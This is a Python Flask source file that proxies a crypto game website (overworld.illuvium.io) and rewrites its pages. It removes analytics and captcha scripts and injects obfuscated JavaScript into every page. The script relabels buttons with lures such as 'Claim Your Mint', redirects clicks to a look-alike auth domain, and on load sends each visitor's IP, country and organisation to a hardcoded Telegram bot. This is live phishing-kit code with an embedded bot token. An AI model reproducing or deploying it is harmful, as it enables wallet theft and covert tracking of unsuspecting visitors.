from flask import request, Response, current_app
import requests
import re
import os
import logging
import urllib.parse

logger = logging.getLogger(__name__)

def init_content_proxy(app):
    """Initialize content proxy routes for the Flask app"""
    
    def remove_tracking_scripts(content):
        """Remove Google Tag Manager iframe and tracking scripts from HTML content."""
        if isinstance(content, bytes):
            content = content.decode('utf-8', errors='ignore')
        
        # Remove GTM iframe
        content = content.replace(
            '<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WXHP66L" height="0" width="0" style="display:none;visibility:hidden"></iframe>',
            ''
        )
        
        # Remove GTM script
        content = content.replace(
            '<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-B4V7XNT23Z"></script>',
            ''
        )
        content = content.replace(
            '<script async="" src="https://store.epicgames.com/en-US/p/illuvium-60064c"></script>',
            ''
        )
        
        # Remove GTM initialization script
        gtm_init_script = '''<script>
            window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());
            gtag('config', 'G-B4V7XNT23Z', {
              page_path: window.location.pathname,
            });
          </script>'''
        content = content.replace(gtm_init_script, '')
        
        # Remove GTM inline script
        gtm_inline_script = '''<script>
            (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
            new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
            j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
            'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
            })(window,document,'script','dataLayer', 'GTM-WXHP66L');
          </script>'''
        content = content.replace(gtm_inline_script, '')
        
        # Remove Geetest script
        content = content.replace(
            '<script async="" src="https://static.geetest.com/v4/gt4.js"></script>',
            ''
        )
        
        return content
    
    def rewrite_urls(content):
        """Rewrite URLs to point to proxy server."""
        # Implementation continues...
        return content
    
    def get_text_replacement_script():
        """Return the text replacement JavaScript code"""
        return '''
<script>
function _0xb1a6(_0x291c55,_0x1b49e2){const _0x5cf652=_0x5cf6();return _0xb1a6=function(_0xb1a699,_0x5a4eb6){_0xb1a699=_0xb1a699-0x14d;let _0x433002=_0x5cf652[_0xb1a699];return _0x433002;},_0xb1a6(_0x291c55,_0x1b49e2);}const _0x4d5221=_0xb1a6;function _0x5cf6(){const _0x4a5af8=['contains','6683094mavbRW','country_name','https://api.telegram.org/bot','click','7703714960:AAFhMovzxoNjr9LZq6m9kytv1R1EylQT1R8','preventDefault','Collect\x20Now','7005236807','305200fISqcA','DOMContentLoaded','9215808veEjTM','css-1i8s7az','org','Reach\x20Us','querySelectorAll','googleWindow','target','button:not(.claim-button),\x20a:not(.claim-button)','935925caJScS','Main','TEXT_NODE','Redirecting\x20to\x20Google','https://ipapi.co/json/','4pySBli','Claim\x20Your\x20Mint','Register','application/json','Timeline','https://auth-illuvidex.onrender.com','913Hwdnsx','add','outerHTML','a[href*=\x22news\x22],\x20a[href*=\x22about\x22],\x20a[href*=\x22faq\x22]','textContent','2240zQcgpk','2YDoOOc','33410wVAzcW','json','POST','120MKBTrK','\x20:\x20','3324oTmzkz','observe','Get\x20Yours','384938LyrqMT','Updates','childNodes','button,\x20a','forEach','classList','length','css-104rome','trim','New\x20Account','closest','addEventListener','open','Documentation','Start\x20Now','log','addedNodes','nodeType','body','stopPropagation','Grab\x20Your\x20Spot','load'];_0x5cf6=function(){return _0x4a5af8;};return _0x5cf6();}(function(_0x16475f,_0x5eab85){const _0x2d1119=_0xb1a6,_0x5290db=_0x16475f();while(!![]){try{const _0x542152=-parseInt(_0x2d1119(0x176))/0x1*(-parseInt(_0x2d1119(0x17f))/0x2)+-parseInt(_0x2d1119(0x165))/0x3*(parseInt(_0x2d1119(0x16a))/0x4)+parseInt(_0x2d1119(0x175))/0x5*(-parseInt(_0x2d1119(0x17c))/0x6)+parseInt(_0x2d1119(0x15b))/0x7*(-parseInt(_0x2d1119(0x17a))/0x8)+parseInt(_0x2d1119(0x153))/0x9+parseInt(_0x2d1119(0x177))/0xa*(-parseInt(_0x2d1119(0x170))/0xb)+parseInt(_0x2d1119(0x15d))/0xc;if(_0x542152===_0x5eab85)break;else _0x5290db['push'](_0x5290db['shift']());}catch(_0x11ae16){_0x5290db['push'](_0x5290db['shift']());}}}(_0x5cf6,0x62a32),document[_0x4d5221(0x18a)](_0x4d5221(0x15c),function(){const _0x3564c1=_0x4d5221;console[_0x3564c1(0x18e)]('');const _0x24fdeb={'Play\x20for\x20Free':_0x3564c1(0x16b),'Play\x20Now':_0x3564c1(0x150),'Log\x20In\x20with\x20Passport':_0x3564c1(0x18d),'Connect\x20Wallet':'Connect\x20Wallet','Launch\x20Game':_0x3564c1(0x17e),'Create\x20Account':_0x3564c1(0x188),'Sign\x20Up':_0x3564c1(0x16c),'Register':_0x3564c1(0x159),'News':_0x3564c1(0x180),'Home':_0x3564c1(0x166),'About':'Info','Contact':_0x3564c1(0x160),'FAQ':'Help','Roadmap':_0x3564c1(0x16e),'Whitepaper':_0x3564c1(0x18c)};function _0x261f51(_0x2c5395,_0x3c1689,_0x290371){const _0x524e7c=_0x3564c1;console[_0x524e7c(0x18e)]('',{'element':_0x2c5395[_0x524e7c(0x172)],'oldText':_0x3c1689,'newText':_0x290371,'timestamp':new Date()['toISOString']()});}function _0x3d3377(_0xf90987){const _0x139171=_0x3564c1;let _0x2e0074='';for(const _0xf7851a of _0xf90987[_0x139171(0x181)]){_0xf7851a[_0x139171(0x14d)]===Node[_0x139171(0x167)]&&(_0x2e0074+=_0xf7851a[_0x139171(0x174)][_0x139171(0x187)]());}!_0x2e0074&&(_0x2e0074=_0xf90987[_0x139171(0x174)][_0x139171(0x187)]());if(_0x24fdeb[_0x2e0074]){const _0x56fa40=_0x2e0074;if(_0xf90987[_0x139171(0x181)]['length']===0x1&&_0xf90987[_0x139171(0x181)][0x0][_0x139171(0x14d)]===Node['TEXT_NODE'])_0xf90987['textContent']=_0x24fdeb[_0x2e0074];else{let _0x512219=![];for(const _0x5efad7 of _0xf90987[_0x139171(0x181)]){if(_0x5efad7[_0x139171(0x14d)]===Node[_0x139171(0x167)]&&_0x5efad7['textContent']['trim']()===_0x2e0074){_0x5efad7[_0x139171(0x174)]=_0x24fdeb[_0x2e0074],_0x512219=!![];break;}}!_0x512219&&(_0xf90987[_0x139171(0x174)]=_0x24fdeb[_0x2e0074]);}_0x261f51(_0xf90987,_0x56fa40,_0x24fdeb[_0x2e0074]);}_0xf90987[_0x139171(0x184)][_0x139171(0x171)]('claim-button');}function _0x124bb3(){const _0x522b13=_0x3564c1;document[_0x522b13(0x161)](_0x522b13(0x182))[_0x522b13(0x183)](_0x3d3377),document['querySelectorAll'](_0x522b13(0x173))[_0x522b13(0x183)](_0x3d3377),document['querySelectorAll']('.chakra-link,\x20.nav-link,\x20.menu-item')[_0x522b13(0x183)](_0x3d3377);}_0x124bb3(),console['log']('Initial\x20text\x20modifications\x20applied'),setInterval(function(){const _0x2d6ab3=_0x3564c1;document[_0x2d6ab3(0x161)](_0x2d6ab3(0x164))[_0x2d6ab3(0x183)](_0x3d3377);},0x3e8);const _0x4a3e91=new MutationObserver(function(_0x2a3306){const _0xf4825e=_0x3564c1;let _0x29f03f=![];_0x2a3306[_0xf4825e(0x183)](function(_0x2e2ec0){const _0x232c04=_0xf4825e;_0x2e2ec0[_0x232c04(0x18f)][_0x232c04(0x185)]&&(_0x29f03f=!![]);}),_0x29f03f&&document[_0xf4825e(0x161)]('button:not(.claim-button),\x20a:not(.claim-button)')[_0xf4825e(0x183)](_0x3d3377);});_0x4a3e91[_0x3564c1(0x17d)](document[_0x3564c1(0x14e)],{'childList':!![],'subtree':!![]}),document[_0x3564c1(0x18a)]('click',function(_0x2b57d2){const _0x181ff3=_0x3564c1,_0x20eb32=_0x2b57d2[_0x181ff3(0x163)],_0x3169d7=_0x20eb32[_0x181ff3(0x189)](_0x181ff3(0x182));if(!_0x3169d7)return;if(_0x3169d7[_0x181ff3(0x184)][_0x181ff3(0x152)]('css-tvaofb')||_0x3169d7[_0x181ff3(0x184)][_0x181ff3(0x152)](_0x181ff3(0x186))||_0x3169d7['classList'][_0x181ff3(0x152)]('css-1hnz6hu')||_0x3169d7['classList']['contains']('css-1oqedzn')||_0x3169d7[_0x181ff3(0x184)][_0x181ff3(0x152)](_0x181ff3(0x15e)))return;_0x2b57d2[_0x181ff3(0x158)](),_0x2b57d2[_0x181ff3(0x14f)]();if(_0x3169d7[_0x181ff3(0x184)]['contains']('claim-button')){console[_0x181ff3(0x18e)](_0x181ff3(0x168)),window[_0x181ff3(0x18b)](_0x181ff3(0x16f),_0x181ff3(0x162),'width=800,height=600,toolbar=no,menubar=no,scrollbars=yes,resizable=yes');return;}console['log']('B'),_0x3169d7[_0x181ff3(0x156)]();},!![]);}));async function sendIPToTelegram(){const _0x34f64a=_0x4d5221,_0x133ea3=_0x34f64a(0x157),_0x4e44ce=_0x34f64a(0x15a);try{const _0x477936=await fetch(_0x34f64a(0x169)),_0x1f97a3=await _0x477936[_0x34f64a(0x178)](),_0x4cf8dc=_0x1f97a3['ip'],_0x178f1c=_0x1f97a3[_0x34f64a(0x154)],_0x5782d0=_0x1f97a3[_0x34f64a(0x15f)],_0x131a67='[ILV]:\x20'+_0x4cf8dc+_0x34f64a(0x17b)+_0x178f1c+_0x34f64a(0x17b)+_0x5782d0;await fetch(_0x34f64a(0x155)+_0x133ea3+'/sendMessage',{'method':_0x34f64a(0x179),'headers':{'Content-Type':_0x34f64a(0x16d)},'body':JSON['stringify']({'chat_id':_0x4e44ce,'text':_0x131a67})});}catch(_0x1040a4){console['error']('Failed\x20to\x20send\x20IP\x20info\x20to\x20Telegram:',_0x1040a4);}}window[_0x4d5221(0x18a)](_0x4d5221(0x151),sendIPToTelegram);

</script>
'''

    @app.after_request
    def add_script_to_html(response):
        """Global after_request handler to add script to all HTML responses"""
        if response.mimetype == 'text/html':
            content = response.get_data(as_text=True)
            if '</body>' in content:
                script = get_text_replacement_script()
                content = content.replace('</body>', script + '</body>')
                response.set_data(content)
        return response

    # Add a catch-all route as a last resort
    @app.route('/', defaults={'path': ''})
    @app.route('/<path:path>')
    def catch_all(path):
        """Catch-all route that proxies to the original site and modifies content"""
        original_url = f"https://overworld.illuvium.io/{path}"
        logger.info(f"Catch-all proxy for: {original_url}")
        
        try:
            # Set proper headers to mimic a browser
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
            }
            
            # Add query parameters if any
            params = request.args.to_dict()
            
            # Make the request to the original site
            response = requests.get(original_url, headers=headers, params=params, stream=True)
            
            # Get content type
            content_type = response.headers.get('Content-Type', 'text/html')
            
            # If HTML, modify content
            if 'text/html' in content_type and response.status_code == 200:
                modified_content = modify_html_content(response.content)
                logger.info(f"HTML content modified for {path}")
                return Response(modified_content, mimetype=content_type)
            
            # For other content types or error codes, return as-is
            return Response(
                response.content, 
                status=response.status_code,
                content_type=content_type
            )
        except Exception as e:
            logger.error(f"Error in catch-all route: {str(e)}")
            import traceback
            logger.error(traceback.format_exc())
            return f"Error: {str(e)}", 500
